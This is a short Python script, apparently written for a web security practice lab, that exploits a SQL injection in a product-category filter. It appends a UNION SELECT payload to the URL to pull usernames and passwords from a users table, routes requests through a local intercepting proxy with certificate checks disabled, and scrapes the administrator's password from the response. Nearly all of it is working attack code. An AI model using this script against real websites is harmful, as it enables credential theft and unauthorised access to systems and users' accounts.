import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = "administrator"
    path= "/filter?category=Pets"
    sql_payload = "' UNION SELECT username, password FROM users--"
    req = requests.get(url + path + sql_payload, proxies=proxies, verify=False)
    res = req.text
    if "administrator" in res:
        print("[+] Found the admin credentials:")
        soup = BeautifulSoup(res, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.find_next("td").contents[0]
        print(" the admin password is: " + admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() #we take the URL from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        sys.exit(-1)


print("[+] Dumping the list of usernames and passwords...")

if not exploit_sqli_users_table(url):
    print("[-] Could not exploit the users table")
    sys.exit(-1)

